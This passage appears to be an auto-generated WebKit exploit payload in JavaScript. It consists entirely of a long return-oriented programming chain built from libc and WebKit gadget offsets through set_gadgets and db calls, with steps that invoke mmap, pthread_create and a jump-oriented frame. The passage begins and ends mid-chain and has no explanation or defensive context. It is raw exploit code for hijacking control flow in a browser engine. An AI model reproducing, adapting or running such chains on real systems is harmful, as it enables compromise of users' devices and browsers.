libc_base+793877, 
ropchain+154400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+154496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+154552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([16, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+154704, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+154760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+154864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([32, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+154968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+154984, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155112, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+155208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+155312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155456, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+155576, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+86456, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+155648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+155752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
jop_frame_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+156040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+156144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+156304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+156272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+156384, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+156488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+156648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+156616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+156752, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+157584, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+156888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+156904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+157024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+157008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157152, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157248, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+157352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+157336, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157464, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157560, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
pthread_create_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+158904, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
mmap_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+160232, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160304, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+160392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+160440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+160560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+160544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160688, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160784, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+160888, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+160872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161000, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+161112, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161096, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+161184, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+161272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+161400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+161552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161536, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+136, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+161704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+161688, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161808, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+161928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+162128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+162144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+162112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+162248, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+162296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+162264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+162408, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+162400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+162424, 
ropchain+163248, 
libc_base+50775, 
libc_base+793877, 
ropchain+162464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+162592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+162576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+162688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+162832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+162816, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+136, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+162984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+163016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+162968, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+163112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+163216, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+165632, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+163288, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+163392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+163568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+163536, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163520, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+163624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+163728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+163760, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+163920, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+163872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+163976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+164080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+164184, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164200, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+164360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
